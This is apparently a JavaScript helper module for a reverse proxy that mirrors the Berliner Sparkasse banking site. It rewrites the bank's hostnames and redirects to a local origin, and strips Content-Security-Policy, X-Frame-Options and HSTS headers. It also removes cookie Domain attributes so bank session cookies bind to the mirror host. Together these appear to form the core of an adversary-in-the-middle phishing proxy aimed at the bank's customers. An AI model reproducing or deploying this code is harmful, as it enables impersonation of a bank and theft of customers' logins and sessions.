export const HOP_BY_HOP = new Set([
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-authorization',
  'te',
  'trailers',
  'transfer-encoding',
  'upgrade',
  'host',
  'content-length',
]);

export const STRIP_RESPONSE_HEADERS = new Set([
  'content-security-policy',
  'x-frame-options',
  'strict-transport-security',
]);

const NEEDLE = 'berliner-sparkasse.de';

export function mirrorHostname(req, fallbackPort) {
  const host = req.headers.host || `localhost:${fallbackPort}`;
  return host.split(':')[0];
}

export function localOrigin(req, port) {
  const host = req.headers.host || `localhost:${port}`;
  const proto = req.headers['x-forwarded-proto'] || 'http';
  return `${proto}://${host}`;
}

export function isHtmlContentType(ct) {
  return (ct || '').toLowerCase().includes('text/html');
}

/** Build fast rewriter once — skips hosts not present in text. */
export function createRewriter(rewriteHosts, origin) {
  const rules = rewriteHosts.map(({ from, to }) => [from, `${origin}${to}`]);
  return function rewriteText(text) {
    if (!text.includes(NEEDLE) && !text.includes('sparkasse.de')) return text;
    let out = text;
    for (const [from, to] of rules) {
      if (!out.includes(from)) continue;
      out = out.split(from).join(to);
    }
    return out;
  };
}

export function rewriteLocation(loc, rewriteHosts, origin) {
  if (!loc) return loc;
  if (loc.startsWith('/')) return `${origin}${loc}`;
  for (const { from, to } of rewriteHosts) {
    if (loc.startsWith(from)) return `${origin}${to}${loc.slice(from.length)}`;
  }
  return loc;
}

export function copyResponseHeaders(upstream, extra = {}) {
  const headers = { ...extra };
  for (const [k, v] of upstream.headers) {
    const key = k.toLowerCase();
    if (HOP_BY_HOP.has(key)) continue;
    if (STRIP_RESPONSE_HEADERS.has(key)) continue;
    headers[k] = v;
  }
  return headers;
}

export function rewriteSetCookie(value, mirrorHost) {
  return value
    .replace(/;\s*Domain=[^;]*/gi, '')
    .replace(/;\s*Secure/gi, mirrorHost === 'localhost' ? '' : '; Secure');
}
